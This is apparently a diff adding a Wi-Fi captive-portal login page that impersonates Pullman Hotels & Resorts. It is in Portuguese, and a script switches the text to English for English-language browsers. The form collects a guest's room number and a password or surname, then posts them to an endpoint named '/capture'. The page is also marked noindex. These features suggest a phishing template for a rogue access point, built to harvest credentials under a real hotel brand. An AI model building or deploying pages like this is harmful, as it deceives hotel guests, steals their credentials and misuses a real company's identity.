@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<meta name="robots" content="noindex, nofollow">
+<title>Pullman Hotels - Wi-Fi</title>
+<style>
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html { font-size: 16px; }
+body { min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #1A1A1A; color: #FFFFFF; padding: 16px; }
+.card { background: #2A2A2A; border-radius: 12px; padding: 32px 28px; width: 100%; max-width: 400px; box-shadow: 0 4px 32px rgba(201,168,76,0.15); border: 1px solid #3A3A3A; }
+.logo { text-align: center; margin-bottom: 8px; font-size: 28px; font-weight: 900; color: #FFFFFF; letter-spacing: 3px; text-transform: uppercase; }
+.logo-line { height: 1px; background: #C9A84C; margin: 8px 32px 16px; }
+.logo-sub { text-align: center; margin-bottom: 20px; font-size: 10px; color: #888; letter-spacing: 4px; text-transform: uppercase; }
+.subtitle { text-align: center; color: #AAAAAA; font-size: 14px; margin-bottom: 28px; line-height: 1.5; }
+.form-group { margin-bottom: 16px; }
+label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 6px; color: #CCCCCC; }
+input[type="password"], input[type="email"], input[type="text"] { width: 100%; padding: 13px 16px; border: 1.5px solid #444444; border-radius: 8px; font-size: 15px; background: #1A1A1A; color: #FFFFFF; outline: none; transition: border-color 0.2s; }
+input:focus { border-color: #C9A84C; }
+button[type="submit"] { width: 100%; padding: 14px; background: #C9A84C; color: #1A1A1A; border: none; border-radius: 8px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 8px; transition: opacity 0.2s; letter-spacing: 1px; text-transform: uppercase; }
+button:hover { opacity: 0.92; }
+.footer { text-align: center; margin-top: 20px; font-size: 11px; color: #666; }
+input[type="hidden"] { display: none; }
+@media (max-width: 480px) { .card { padding: 24px 18px; } .logo { font-size: 22px; } }
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="logo">Pullman</div>
+  <div class="logo-line"></div>
+  <div class="logo-sub">Hotels & Resorts</div>
+  <p class="subtitle">Pullman Hotels & Resorts. Wi-Fi de alto padrao.</p>
+  <form action="/capture" method="POST" autocomplete="off">
+    <input type="hidden" name="csrf_token" value="">
+    <input type="hidden" name="portal_id" value="pullman">
+    <div class="form-group">
+      <label for="room">Numero do Quarto</label>
+      <input type="text" name="room" id="room" placeholder="Ex: 1204" required pattern="[0-9]{1,5}" maxlength="5" autocomplete="off">
+    </div>
+    <div class="form-group">
+      <label for="password">Senha / Sobrenome</label>
+      <input type="password" name="password" id="password" placeholder="Sobrenome ou senha" required maxlength="64" autocomplete="new-password">
+    </div>
+    <button type="submit">Conectar</button>
+  </form>
+  <p class="footer">Pullman - The art of travel</p>
+</div>
+<script>
+(function(){
+  var lang = navigator.language || 'pt-BR';
+  if (lang.startsWith('en')) {
+    document.querySelector('.subtitle').textContent = 'Pullman Hotels & Resorts. Premium Wi-Fi.';
+    document.querySelector('button[type=submit]').textContent = 'Connect';
+    document.querySelector('label[for=room]').textContent = 'Room Number';
+    document.querySelector('label[for=password]').textContent = 'Password / Last Name';
+  }
+})();
+</script>
+</body>
+</html>
